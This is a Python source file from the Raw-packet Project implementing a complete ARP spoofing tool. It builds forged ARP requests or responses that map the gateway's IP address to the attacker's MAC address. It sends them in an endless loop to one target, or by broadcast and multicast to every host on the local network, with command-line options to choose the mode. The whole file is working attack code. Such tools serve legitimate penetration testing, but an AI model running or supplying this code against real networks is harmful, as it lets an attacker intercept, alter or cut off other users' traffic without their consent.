#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
arp_spoof.py: ARP Spoofing (arp_spoof)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.network import RawARP, RawSend
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from time import sleep
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
__script_name__ = 'ARP Spoofing (arp_spoof)'
# endregion


# region class ArpSpoof
class ArpSpoof:

    # region Variables
    _base: Base = Base()
    _utils: Utils = Utils()
    _arp: RawARP = RawARP()
    
    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None}
    _target: Dict[str, Union[None, str]] = {'ipv4-address': None, 'mac-address': None, 'vendor': None}
    # endregion

    # region Init
    def __init__(self, network_interface: str) -> None:
        """
        Init
        :param network_interface: Network interface name
        """
        self._your = self._base.get_interface_settings(interface_name=network_interface, 
                                                       required_parameters=['mac-address', 
                                                                            'ipv4-address',
                                                                            'first-ipv4-address',
                                                                            'last-ipv4-address'])
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion

    # region Start ARP Spoofing
    def start(self, 
              gateway_ip_address: Union[None, str] = None,
              target_ip_address: Union[None, str] = None,
              target_mac_address: Union[None, str] = None,
              ipv4_multicast_requests: bool = False,
              ipv6_multicast_requests: bool = False,
              broadcast_requests: bool = False,
              requests: bool = False,
              quit: bool = False) -> None:
        """
        Start ARP Spoofing
        :param gateway_ip_address:
        :param target_ip_address:
        :param target_mac_address:
        :param ipv4_multicast_requests:
        :param ipv6_multicast_requests:
        :param broadcast_requests:
        :param requests:
        :param quit:
        :return: None
        """
        try:

            # region Set gateway IP address
            if gateway_ip_address is None:
                gateway_ip_address: str = self._your['ipv4-gateway']
                assert gateway_ip_address is not None, \
                    'Network interface: ' + self._base.error_text(self._your['network-interface']) + \
                    ' does not have IPv4 gateway! Please set IPv4 gateway address!'
            else:
                gateway_ip_address: str = \
                    self._utils.check_local_ipv4_address(network_interface=self._your['network-interface'],
                                                         ipv4_address=gateway_ip_address,
                                                         parameter_name='gateway IPv4 address')
            # endregion
    
            # region General output
            if not quit:
                self._base.print_info('Network interface: ', self._your['network-interface'])
                self._base.print_info('Gateway IP address: ', gateway_ip_address)
                self._base.print_info('Your IP address: ', self._your['ipv4-address'])
                self._base.print_info('Your MAC address: ', self._your['mac-address'])
                self._base.print_info('First ip address: ', self._your['first-ipv4-address'])
                self._base.print_info('Last ip address: ', self._your['last-ipv4-address'])
            # endregion
    
            # region ARP spoofing with IPv4/IPv6 Multicast/Broadcast ARP requests
            if ipv4_multicast_requests or ipv6_multicast_requests or broadcast_requests:
                if ipv4_multicast_requests:
                    ethernet_destination_mac_address: str = '01:00:5e:00:00:01'
                    self._base.print_info('Send ARP requests to IPv4 multicast MAC address: ',
                                          ethernet_destination_mac_address)
                elif ipv6_multicast_requests:
                    ethernet_destination_mac_address: str = '33:33:00:00:00:01'
                    self._base.print_info('Send ARP requests to IPv6 multicast MAC address: ',
                                          ethernet_destination_mac_address)
                else:
                    ethernet_destination_mac_address: str = 'ff:ff:ff:ff:ff:ff'
                    self._base.print_info('Send ARP requests to broadcast MAC address: ',
                                          ethernet_destination_mac_address)
    
                self._base.print_info('Spoof ARP table in all hosts: ', gateway_ip_address,
                                      ' -> ', self._your['mac-address'])
                self._base.print_info('ARP spoofing is running ...')
    
                while True:
                    arp_request: bytes = self._arp.make_request(
                        ethernet_src_mac=self._your['mac-address'],
                        ethernet_dst_mac=ethernet_destination_mac_address,
                        sender_mac=self._your['mac-address'],
                        sender_ip=gateway_ip_address,
                        target_mac='00:00:00:00:00:00',
                        target_ip=self._your['ipv4-address'])
                    self._raw_send.send(packet=arp_request, count=5)
                    sleep(1)
            # endregion
    
            # region Set target
            self._target = self._utils.set_ipv4_target(network_interface=self._your['network-interface'],
                                                       target_ipv4_address=target_ip_address,
                                                       target_mac_address=target_mac_address,
                                                       exclude_ipv4_addresses=[gateway_ip_address])
            
            if not quit:
                self._base.print_success('Target IP address: ', self._target['ipv4-address'])
                self._base.print_success('Target MAC address: ', self._target['mac-address'])
                if self._target['vendor'] is not None:
                    self._base.print_success('Target vendor: ', self._target['vendor'])
            # endregion
    
            # region Spoof ARP table
            self._base.print_info('Spoof ARP table: ', gateway_ip_address + ' -> ' + self._your['mac-address'])
    
            # region ARP spoofing with ARP requests
            if requests:
                self._base.print_info('Send ARP requests to: ',
                                      self._target['ipv4-address'] + ' (' +
                                      self._target['mac-address'] + ')')
                self._base.print_info('Start ARP spoofing ...')
                while True:
                    random_ip: str = self._base.get_random_ip_on_interface(self._your['network-interface'])
                    arp_request: bytes = \
                        self._arp.make_request(ethernet_src_mac=self._your['mac-address'],
                                               ethernet_dst_mac=self._target['mac-address'],
                                               sender_mac=self._your['mac-address'],
                                               sender_ip=gateway_ip_address,
                                               target_mac='00:00:00:00:00:00',
                                               target_ip=random_ip)
                    self._raw_send.send(arp_request)
                    sleep(1)
            # endregion
    
            # region ARP spoofing with ARP responses
            else:
                self._base.print_info('Send ARP responses to: ',
                                      self._target['ipv4-address'] + ' (' +
                                      self._target['mac-address'] + ')')
                self._base.print_info('Start ARP spoofing ...')
                arp_response: bytes = \
                    self._arp.make_response(ethernet_src_mac=self._your['mac-address'],
                                            ethernet_dst_mac=self._target['mac-address'],
                                            sender_mac=self._your['mac-address'],
                                            sender_ip=gateway_ip_address,
                                            target_mac=self._target['mac-address'],
                                            target_ip=self._target['ipv4-address'])
                while True:
                    self._raw_send.send(arp_response)
                    sleep(1)
            # endregion

            # endregion

        except KeyboardInterrupt:
            if not quit:
                self._base.print_info('Exit')
            exit(0)

        except AssertionError as Error:
            if not quit:
                self._base.print_error(Error.args[0])
            exit(1)
    # endregion

# endregion


# region Main function
def main():

    # region Init Raw-packet classes
    base: Base = Base()
    # endregion

    # region Check user and platform
    base.check_user()
    base.check_platform(available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    script_description: str = \
        base.get_banner() + '\n' + \
        ' ' * (int((55 - len(__script_name__)) / 2)) + \
        base.info_text(__script_name__) + '\n\n'
    parser = ArgumentParser(description=script_description, formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets', default=None)
    parser.add_argument('-t', '--target_ip', help='Set target IP address', default=None)
    parser.add_argument('-m', '--target_mac', help='Set target MAC address', default=None)
    parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address', default=None)
    parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
    parser.add_argument('--ipv4_multicast_requests', action='store_true', help='Send only ARP IPv4 multicast requests')
    parser.add_argument('--ipv6_multicast_requests', action='store_true', help='Send only ARP IPv6 multicast requests')
    parser.add_argument('-R', '--broadcast_requests', action='store_true', help='Send only ARP broadcast requests')
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    args = parser.parse_args()
    # endregion

    # region Print banner if argument quit is not set
    if not args.quiet:
        base.print_banner()
    # endregion

    # region Get listen network interface, your IP and MAC address, first and last IP in local network
    if args.interface is None:
        base.print_warning('Please set a network interface for send ARP spoofing packets ...')
    current_network_interface: str = base.network_interface_selection(args.interface)
    # endregion
    
    # region Start Arp Spoof
    arp_spoof: ArpSpoof = ArpSpoof(network_interface=current_network_interface)
    arp_spoof.start(gateway_ip_address=args.gateway_ip,
                    target_ip_address=args.target_ip,
                    target_mac_address=args.target_mac,
                    ipv4_multicast_requests=args.ipv4_multicast_requests,
                    ipv6_multicast_requests=args.ipv6_multicast_requests,
                    broadcast_requests=args.broadcast_requests,
                    requests=args.requests,
                    quit=args.quiet)
    # endregion

# endregion


# region Call Main function
if __name__ == "__main__":
    main()
# endregion
